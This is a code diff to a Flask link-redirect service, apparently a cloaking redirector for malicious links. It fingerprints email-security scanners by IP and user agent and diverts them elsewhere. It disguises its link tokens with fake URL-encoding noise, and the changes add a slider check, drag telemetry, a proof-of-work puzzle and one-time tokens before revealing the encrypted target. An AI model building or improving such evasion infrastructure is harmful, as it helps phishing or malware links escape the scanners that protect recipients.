@@ -3,6 +3,7 @@ import time
 import json
 import secrets
 import base64
+import hashlib
 import logging
 from ipaddress import ip_address, ip_network
 from urllib.parse import quote
@@ -99,6 +100,9 @@ SCANNER_UA_TOKENS = (
     "newrelic", "datadog synthetics", "yahoo", "aol", "verizon", "symantec", "webpulse", "bluecoat", "messagelabs",
 )
 
+# In-memory store for one-time tokens
+USED_TOKENS = set()
+
 def client_ip() -> str:
     xff = request.headers.get("X-Forwarded-For", "")
     return xff.split(",")[0].strip() if xff else request.remote_addr or ""
@@ -133,28 +137,16 @@ def classify(ip: str, ua: str) -> dict:
 def unseal_payload(blob):
     if not blob.startswith("u001."): return None
     try:
-        # 1. Strip prefix and trailing -3D-3D
         core = blob[5:].replace("-3D-3D", "")
-        
-        # 2. Strip fake hex noise
         clean = core.replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
-        
-        # 3. Split on the dot separator
         parts = clean.split(".", 1)
         if len(parts) < 2:
             return None
-            
         b64_ciphertext = parts[1]
-        
-        # 4. Base64 decode
         padding = '=' * (-len(b64_ciphertext) % 4)
         raw_bytes = base64.urlsafe_b64decode(b64_ciphertext + padding)
-        
-        # 5. Split nonce and ciphertext
         nonce = raw_bytes[:12]
         ciphertext = raw_bytes[12:]
-        
-        # 6. Decrypt
         aesgcm = AESGCM(AES_KEY)
         plaintext = aesgcm.decrypt(nonce, ciphertext, None)
         return json.loads(plaintext.decode('utf-8'))
@@ -166,6 +158,9 @@ def _static_page(title: str, text: str, status_code: int):
     html = f"<html><body><h1>{title}</h1><p>{text}</p></body></html>"
     return make_response(html, status_code)
 
+# ---------------------------------------------------------------------------
+# LANDING PAGE (With PoW and Telemetry)
+# ---------------------------------------------------------------------------
 LANDING = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -201,6 +196,10 @@ LANDING = """<!DOCTYPE html>
         <form id="challenge-form" method="POST" action="{{ action }}" style="display:none;">
             <input type="hidden" name="n" value="{{ nonce }}">
             <input type="hidden" name="t" value="{{ token }}">
+            <input type="hidden" name="challenge" value="{{ challenge }}">
+            <input type="hidden" name="pow_nonce" id="pow_nonce" value="">
+            <input type="hidden" name="drag_time" id="drag_time" value="0">
+            <input type="hidden" name="drag_events" id="drag_events" value="0">
         </form>
     </div>
     <script>
@@ -210,23 +209,45 @@ LANDING = """<!DOCTYPE html>
         const text = document.getElementById('slider-text');
         const successText = document.getElementById('success-text');
         const form = document.getElementById('challenge-form');
-        let isDragging = false; let startX = 0; let maxDelta = 0;
+        
+        let isDragging = false; 
+        let startX = 0; 
+        let maxDelta = 0;
+        let dragStartTime = 0;
+        let dragEvents = 0;
+
         function init() { maxDelta = container.offsetWidth - handle.offsetWidth - 10; }
         window.onload = init; window.onresize = init;
-        handle.addEventListener('mousedown', startDrag); handle.addEventListener('touchstart', startDrag, {passive: true});
-        document.addEventListener('mousemove', onDrag); document.addEventListener('touchmove', onDrag, {passive: false});
-        document.addEventListener('mouseup', endDrag); document.addEventListener('touchend', endDrag);
-        function startDrag(e) { isDragging = true; startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; }
+
+        handle.addEventListener('mousedown', startDrag); 
+        handle.addEventListener('touchstart', startDrag, {passive: true});
+        document.addEventListener('mousemove', onDrag); 
+        document.addEventListener('touchmove', onDrag, {passive: false});
+        document.addEventListener('mouseup', endDrag); 
+        document.addEventListener('touchend', endDrag);
+
+        function startDrag(e) { 
+            isDragging = true; 
+            dragStartTime = Date.now();
+            dragEvents = 0;
+            startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; 
+        }
+
         function onDrag(e) {
             if (!isDragging) return;
             if (e.cancelable) e.preventDefault();
+            dragEvents++;
+            
             const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
             let deltaX = clientX - startX;
             if (deltaX < 0) deltaX = 0; if (deltaX > maxDelta) deltaX = maxDelta;
+            
             handle.style.left = (5 + deltaX) + 'px';
             progress.style.width = ((deltaX + 40) / container.offsetWidth * 100) + '%';
+            
             if (deltaX >= maxDelta - 2) { completeVerification(); }
         }
+
         function endDrag() {
             if (!isDragging) return; isDragging = false;
             if (parseInt(handle.style.left) < maxDelta) {
@@ -235,16 +256,50 @@ LANDING = """<!DOCTYPE html>
                 setTimeout(() => { handle.style.transition = ''; progress.style.transition = ''; }, 300);
             }
         }
-        function completeVerification() {
-            isDragging = false; handle.style.background = '#48bb78';
+
+        async function completeVerification() {
+            isDragging = false; 
+            
+            const dragDuration = Date.now() - dragStartTime;
+            
+            // Bot check: Reject if drag was too fast or had too few events
+            if (dragDuration < 200 || dragEvents < 5) {
+                document.getElementById("slider-text").innerText = "Automation detected. Try again.";
+                handle.style.left = '5px';
+                progress.style.width = '0%';
+                return; 
+            }
+
+            handle.style.background = '#48bb78';
             handle.innerHTML = '<svg style="fill:white" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
             handle.style.cursor = 'default'; text.style.opacity = '0'; successText.style.display = 'block';
-            setTimeout(function() { form.submit(); }, 500);
+
+            // Proof of Work (PoW)
+            const seed = "{{ challenge }}";
+            let nonce = 0;
+            let hash = "";
+            while (!hash.startsWith("0000")) {
+                nonce++;
+                const data = new TextEncoder().encode(seed + nonce);
+                const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+                const hashArray = Array.from(new Uint8Array(hashBuffer));
+                hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+            }
+
+            // Populate form and submit
+            document.getElementById("pow_nonce").value = nonce;
+            document.getElementById("drag_time").value = dragDuration;
+            document.getElementById("drag_events").value = dragEvents;
+            
+            form.submit();
         }
     </script>
 </body>
 </html>"""
 
+# ---------------------------------------------------------------------------
+# routes
+# ---------------------------------------------------------------------------
 @app.route("/health", methods=["GET"])
 def health():
     return jsonify({"ok": True, "ts": int(time.time())})
@@ -272,10 +327,20 @@ def landing(token: str):
         log.info(json.dumps({"event": "landing_scanner_redirect", **tag, "to": unwanted}))
         return redirect(unwanted, code=302)
 
-    nonce_payload = {"t": eop_token, "ts": time.time()}
+    # Generate a fresh challenge seed for this specific request
+    challenge_seed = secrets.token_hex(16)
+    
+    nonce_payload = {"t": eop_token, "ts": time.time(), "challenge": challenge_seed}
     nonce_blob = cookie_serializer.dumps(nonce_payload)
 
-    html = render_template_string(LANDING, action=f"/submit/{quote(eop_token)}", token=eop_token, nonce=nonce_blob)
+    html = render_template_string(
+        LANDING, 
+        action=f"/submit/{quote(eop_token)}", 
+        token=eop_token, 
+        nonce=nonce_blob,
+        challenge=challenge_seed
+    )
+    
     resp = make_response(html)
     
     is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
@@ -300,6 +365,30 @@ def execute(token: str):
     if not secrets.compare_digest(nonce_data.get("t", ""), token):
         return _static_page("Verification Failed", "Verification payload mismatched.", 400)
 
+    # 1. Check One-Time Token
+    if token in USED_TOKENS:
+        return _static_page("Verification Failed", "Token already used.", 400)
+    USED_TOKENS.add(token)
+
+    # 2. Check Proof of Work
+    submitted_pow = request.form.get("pow_nonce", "")
+    seed = nonce_data.get("challenge", "")
+    
+    if not seed or not submitted_pow:
+        return _static_page("Verification Failed", "Missing PoW data.", 400)
+
+    test_hash = hashlib.sha256((seed + submitted_pow).encode()).hexdigest()
+    if not test_hash.startswith("0000"):
+        return _static_page("Verification Failed", "Invalid PoW.", 400)
+
+    # 3. Check Telemetry
+    drag_time = int(request.form.get("drag_time", 0))
+    drag_events = int(request.form.get("drag_events", 0))
+
+    if drag_time < 200 or drag_events < 5:
+        return _static_page("Verification Failed", "Automated behavior detected.", 400)
+
+    # If all checks pass, execute redirect
     data = unseal_payload(token)
     if not data or "target" not in data:
          return _static_page("Invalid link", "Could not decrypt target.", 404)
